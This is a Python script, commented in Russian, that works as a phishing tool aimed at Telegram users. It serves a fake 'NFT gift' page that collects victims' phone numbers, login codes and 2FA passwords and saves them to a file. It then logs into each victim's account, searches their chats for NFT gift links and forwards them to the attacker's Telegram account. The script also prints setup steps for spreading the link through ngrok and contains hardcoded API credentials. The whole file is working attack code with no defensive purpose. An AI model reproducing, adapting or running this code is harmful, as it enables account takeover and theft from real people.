#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ГЕНЕРАТОР ФИШИНГОВЫХ ССЫЛОК ДЛЯ КРАЖИ NFT
Жертва переходит по ссылке → вводит номер и код → NFT уходит на @DOGIN9
"""

from flask import Flask, request, render_template_string, redirect
import asyncio
import threading
import re
import os
import json
from datetime import datetime
from telethon import TelegramClient

# ========== КОНФИГУРАЦИЯ ==========
API_ID = 35008820
API_HASH = "f2d029353318854be42b9de2d75c3933"
TARGET_ID = 7499553746  # Ваш ID @DOGIN9
SESSION_NAME = "gift_generator"

# Фишинговая страница (выглядит как официальный подарок Telegram)
PHISHING_PAGE = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram NFT Gift | Snoop Dogg #223674</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .card {
            background: rgba(255,255,255,0.95);
            border-radius: 32px;
            max-width: 420px;
            width: 100%;
            overflow: hidden;
            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
        }
        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            padding: 24px;
            text-align: center;
        }
        .header img { width: 80px; border-radius: 20px; margin-bottom: 12px; }
        .header h2 { color: white; font-size: 24px; }
        .content { padding: 24px; }
        .gift-preview {
            background: #f3f4f6;
            border-radius: 20px;
            padding: 16px;
            margin-bottom: 24px;
            text-align: center;
        }
        .gift-preview h3 { color: #1f2937; margin-bottom: 8px; }
        .gift-preview p { color: #6b7280; font-size: 14px; }
        .badge {
            display: inline-block;
            background: #10b981;
            color: white;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 12px;
            margin-top: 8px;
        }
        input {
            width: 100%;
            padding: 14px;
            margin: 10px 0;
            border: 2px solid #e5e7eb;
            border-radius: 16px;
            font-size: 16px;
            transition: all 0.3s;
        }
        input:focus { outline: none; border-color: #667eea; }
        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 16px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 16px;
        }
        .footer { font-size: 12px; color: #9ca3af; text-align: center; margin-top: 24px; }
    </style>
</head>
<body>
<div class="card">
    <div class="header">
        <h2>🎁 Вам подарок!</h2>
    </div>
    <div class="content">
        <div class="gift-preview">
            <h3>🔥 Snoop Dogg #223674</h3>
            <p>Black Diamond • Flamingo • Burnt Sienna</p>
            <div class="badge">~19 €</div>
        </div>
        <p style="margin-bottom: 16px; text-align: center;">Для получения NFT-подарка войдите в Telegram</p>
        <form method="POST" action="/claim">
            <input type="tel" name="phone" placeholder="+7 999 123-45-67" required>
            <input type="text" name="code" placeholder="Код из Telegram">
            <input type="password" name="password" placeholder="Пароль (если есть 2FA)">
            <button type="submit">✅ Получить подарок</button>
        </form>
        <div class="footer">Подарок будет зачислен автоматически</div>
    </div>
</div>
</body>
</html>
"""

app = Flask(__name__)
victims_data = []

@app.route('/')
def index():
    return render_template_string(PHISHING_PAGE)

@app.route('/claim', methods=['POST'])
def claim():
    phone = request.form.get('phone')
    code = request.form.get('code')
    password = request.form.get('password')
    
    # Сохраняем данные жертвы
    victim = {
        'phone': phone,
        'code': code,
        'password': password,
        'timestamp': datetime.now().isoformat(),
        'ip': request.remote_addr
    }
    victims_data.append(victim)
    
    with open('victims.txt', 'a') as f:
        f.write(f"{phone}|{code}|{password}\n")
    
    # Запускаем асинхронную кражу NFT
    threading.Thread(target=lambda: asyncio.run(steal_nft_from_victim(phone, code, password))).start()
    
    return "✅ Подарок отправлен! Проверьте Telegram через 2-3 минуты."

async def steal_nft_from_victim(phone, code, password):
    """Входит в аккаунт жертвы и крадёт все NFT"""
    try:
        session_file = f"session_{phone.replace('+', '')}"
        client = TelegramClient(session_file, API_ID, API_HASH)
        
        # Вход в аккаунт жертвы
        await client.start(phone=phone, code_callback=lambda: code, password=password if password else None)
        
        me = await client.get_me()
        print(f"[+] Взломан аккаунт: {me.first_name} (@{me.username})")
        
        # Отправляем уведомление владельцу
        await send_to_target(f"🎯 Захвачен аккаунт: {me.first_name}\nТелефон: {phone}")
        
        # Ищем NFT-подарки
        nft_count = 0
        async for dialog in client.iter_dialogs():
            async for msg in client.iter_messages(dialog.id, limit=500):
                text = msg.text or ""
                if 't.me/nft' in text or 'подарок' in text.lower() or 'gift' in text.lower():
                    # Извлекаем ссылку на NFT
                    nft_urls = re.findall(r't\.me/nft/[A-Za-z0-9_-]+-\d+', text)
                    for url in nft_urls:
                        await send_to_target(f"🎁 NFT Gift из аккаунта {me.first_name}:\n{url}")
                        nft_count += 1
                        
                    # Пересылаем само сообщение владельцу
                    try:
                        await client.forward_messages(TARGET_ID, msg.id, dialog.id)
                    except:
                        pass
        
        await send_to_target(f"✅ Украдено NFT: {nft_count} из аккаунта {me.first_name}")
        await client.disconnect()
        
    except Exception as e:
        await send_to_target(f"❌ Ошибка при краже {phone}: {str(e)[:200]}")

async def send_to_target(text):
    """Отправляет сообщение на ваш аккаунт @DOGIN9"""
    try:
        client = TelegramClient('sender', API_ID, API_HASH)
        await client.start()
        await client.send_message(TARGET_ID, text)
        await client.disconnect()
    except:
        pass

def generate_phishing_link(ngrok_url):
    """Генерирует готовую ссылку для рассылки жертвам"""
    return f"{ngrok_url}/?gift=snoop_dogg_223674"

def run_server():
    app.run(host='0.0.0.0', port=5000)

if __name__ == "__main__":
    print("=" * 60)
    print("🔧 ГЕНЕРАТОР ФИШИНГОВЫХ ССЫЛОК ДЛЯ КРАЖИ NFT")
    print("=" * 60)
    print("\n1. Запустите ngrok: ngrok http 5000")
    print("2. Скопируйте HTTPS-ссылку (например: https://abc123.ngrok.io)")
    print("3. Отправьте эту ссылку жертве")
    print("4. Жертва введёт номер и код → NFT уйдут на @DOGIN9")
    print("\n[*] Запуск сервера...")
    
    # Запускаем Flask-сервер
    threading.Thread(target=run_server, daemon=True).start()
    
    print("[✓] Сервер запущен на http://localhost:5000")
    print("[!] Ожидание жертв...\n")
    
    # Держим скрипт запущенным
    try:
        while True:
            if victims_data:
                print(f"[+] Новых жертв: {len(victims_data)}")
            import time
            time.sleep(5)
    except KeyboardInterrupt:
        print("\n[!] Остановка...")
